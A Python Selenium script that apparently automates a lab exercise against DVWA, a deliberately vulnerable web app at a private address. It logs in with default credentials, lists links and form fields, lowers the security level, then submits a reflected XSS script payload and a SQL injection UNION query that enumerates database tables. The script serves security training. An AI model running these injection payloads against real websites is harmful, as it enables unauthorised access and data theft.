import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
import requests

options = Options()
options.add_argument('--headless')

#Install Driver

def login():
    #find username field on the webpage and send username to the field
    driver.find_element_by_name('username').send_keys('admin')
    #find password field on the webpage and send password to the field
    driver.find_element_by_name('password').send_keys('password')
    #find login button and press enter on it
    driver.find_element_by_name("Login").send_keys(Keys.ENTER)

#set variable to load firefox options
driver = webdriver.Firefox(options=options)
# load firefox and open webpage
driver.get('http://192.168.209.4/dvwa/login.php')
# run login function to login on the wenpage.
login()

# add 3 seconds delay to load page completely
time.sleep(10)

'''
Next few lines of code is going to extract links from 'href' HTML tag,
write the ouput to a links.txt file.
'''
#find all items that are in in HTML tag 'a'
links = driver.find_elements_by_tag_name('a')
# create/open a file write option
write_file = open("links.txt", "w")
# loop throgh each HTML 'a' tag 
for a_tag in links:
    # extract href from a tag
    link = a_tag.get_attribute('href')
    # if link is not empty
    if link is not None:
        #wrie the output to a file
        write_file.write(link + "\n")
        # print(link)
#close the file
write_file.close()


#set variable to load firefox options
driver = webdriver.Firefox()
# load firefox and open webpage
driver.get('http://192.168.209.4/dvwa/login.php')
# run login function to login on the wenpage.
login()
# add 3 seconds delay to load page completely
time.sleep(10)

'''
Next few lines of code is going to read one line at a time from links.txt file,
extract input fields from forms and write the output to form_fields.txt to 
'''
# open the links.txt file to read the links from file
open_file = open("links.txt", "r")
# create the form_fields.txt file to write the information about form fields
formfields = open("form_fields.txt", "w")
# loop through each link from open_file.txt
for link in open_file:
    # write the url address in form_fields.txt
    formfields.write(link + "\n")
    # open the link in browser
    driver.get(link)
    # write the title of webpage in form_fields.txt
    formfields.write(driver.title + "\n")
    #print(driver.title)
    # find the HTML form tag and input fields of the form
    form_tag = driver.find_elements_by_xpath('//form[@*]//input')
    # loop through each field in form
    for field in form_tag:
        # extract field type
        type_form = field.get_attribute('type')
        # extract field name
        name_form = field.get_attribute('name')
        # write down field type and field name in formfields.txt file
        formfields.write("field type is " + type_form + " and field name is " + name_form + "\n")
# close links.txt file
open_file.close()
# close form_fields.txt file
formfields.close()

# # add 10 seconds delay to load page completely
# time.sleep(10)

# load firefox and open webpage
driver.get('http://192.168.209.4/dvwa/login.php')
# run login function to login on the wenpage.
login()
# add 10 seconds delay to load page completely
time.sleep(10)

'''
Next few lines of code is going to change the security level on DVWA to low
'''
# open security.php page
driver.get("http://192.168.209.4/dvwa/security.php")
# Change the level of security to low under drop down list
Select(driver.find_element_by_name('security')).select_by_value('low')
# add 10 seconds delay
time.sleep(10)
# Find the submit button and click submit
driver.find_element_by_xpath("//*[@value='Submit']").click()
# add 10 seconds delay
time.sleep(10)

'''
Next few lines of code is going to perform reflected XSS vulnerability 
on http://192.168.209.4/dvwa/vulnerabilities/xss_r/
'''
# open http://192.168.209.4/dvwa/vulnerabilities/xss_r/
driver.get("http://192.168.209.4/dvwa/vulnerabilities/xss_r/")
# find the HTML form tag and input fields of the form
driver.find_elements_by_xpath('//form[@*]//input')
# find form field by name and send java script to the field
driver.find_element_by_name('name').send_keys('<script>alert("This webpage is vulnerable to XSS")</script>')
# Find the submit button and click submit
driver.find_element_by_xpath("//*[@value='Submit']").click()
# add 10 seconds delay
time.sleep(10)
# switch to alert window and press Ok
driver.switch_to.alert.accept()
'''
Next few lines of code is going to perform SQL injection 
on http://192.168.209.4/dvwa/vulnerabilities/sqli/
'''
# open http://192.168.209.4/dvwa/vulnerabilities/sqli/ page
driver.get("http://192.168.209.4/dvwa/vulnerabilities/sqli/")
# find the HTML form tag and input fields of the form
driver.find_elements_by_xpath('//form[@*]//input')
# find form field by name and send sql query to the field
driver.find_element_by_name('id').send_keys("1' OR 1=1 UNION SELECT null, table_name FROM INFORMATION_SCHEMA. tables#")
# Find the submit button and click submit
driver.find_element_by_xpath("//*[@value='Submit']").click()
# add 10 seconds delay
time.sleep(10)
